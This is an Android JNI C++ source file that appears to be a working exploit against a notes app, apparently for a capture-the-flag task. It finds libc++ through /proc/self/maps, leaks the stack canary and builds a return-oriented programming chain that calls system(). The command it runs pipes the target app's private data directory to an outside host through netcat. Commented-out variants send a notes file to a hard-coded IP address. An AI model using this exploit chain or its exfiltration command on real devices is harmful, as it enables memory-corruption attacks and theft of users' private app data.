#include <jni.h>
#include <android/log.h>
#include <sys/mman.h>
#include <string>
#include <unistd.h>
#include <inttypes.h>
#include <string>
#include <sstream>
#include <elf.h>
#include <fcntl.h>
#include <dlfcn.h>

static uint64_t get_canary(void) {
    uint64_t buf[1];
    uint64_t *p = buf;
    return p[1];
}

static uint64_t get_system(void) {
    //return reinterpret_cast<uint64_t>(system);
    return reinterpret_cast<uint64_t>(dlsym(RTLD_DEFAULT, "system"));
}

static uint64_t get_open(void) {
    int (*p)(const char *, int, ...) = &open;
    return reinterpret_cast<uint64_t>(p);
}

static uint64_t get_sleep(void) {
    return reinterpret_cast<uint64_t>(sleep);
}

extern "C" JNIEXPORT void
JNICALL
Java_com_example_myapplication_MainActivity_payload(
        JNIEnv *env,
        jclass cls,
        jbyteArray pl) {
    __android_log_print(ANDROID_LOG_ERROR, "hui",
                        "Entering Java_com_example_myapplication_MainActivity_payload()");

    FILE *f = fopen("/proc/self/maps", "r");
    __android_log_print(ANDROID_LOG_ERROR, "hui", "f=%p", f);
    char buf[1024];
    while (true) {
        char *line = fgets(buf, 1024, f);
        __android_log_print(ANDROID_LOG_ERROR, "hui", "maps: %s", line);
        if (!line) {
            break;
        }
        if (strstr(line, "/libc++.so")) {
            break;
        }
    }
    uint64_t map_start{0}, map_end{0};
    sscanf(buf, "%llx-%llx ", &map_start, &map_end);
    __android_log_print(ANDROID_LOG_ERROR, "hui", "map_start=0x%llx, map_end=0x%llx", map_start,
                        map_end);

    jboolean copy{false};
    jbyte *data = env->GetByteArrayElements(pl, &copy);
    uint64_t *rop = (uint64_t *) data;
    uint64_t canary = get_canary();
    int i{0};
    for (i = 0; i < 7; i++) {
        rop[i] = 0xcafe0000 + i;
    }
    //sprintf((char *) data, "nc 77.220.150.12 14880 <*/com.inso.ins24.mynotes.xml");
    //sprintf((char *) data, "echo 1 | nc 77.220.150.12 14880");
    sprintf((char *) data, "cat /data/data/com.inso.ins24/*/*|nc qm.rs 31337");
    rop[i++] = canary;
    rop[i++] = 0xdead001;

#if 0
    // 0x000000000005231f : pop rdi ; ret
    rop[i++] = map_start + 0x5231f;
    rop[i++] = 5;
    rop[i++] = get_sleep();
#endif
#if 0
    // 0x0000000000051dcc : pop rsi ; ret
    rop[i++] = map_start + 0x51dcc;
    rop[i++] = 0; // O_RDONLY
#endif
    // 0xa6d9b: mov rdi, rax ; mov rax, rdi ; pop rcx ; ret ; (1 found)
    rop[i++] = map_start + 0xa6d9b;
    // 561cb:       ff e1                   jmp    *%rcx
    rop[i++] = map_start + 0x561cb;
    for (int j = 0; j < 91; j++) {
        // 51a30:       c3                      ret
        rop[i++] = map_start + 0x51a30;
    }
    rop[i++] = get_system();
    // rop[i++] = map_start + 0x561cb;
    rop[i++] = 0xdeadbeefdeadbeef;
    env->ReleaseByteArrayElements(pl, data, 0);
}
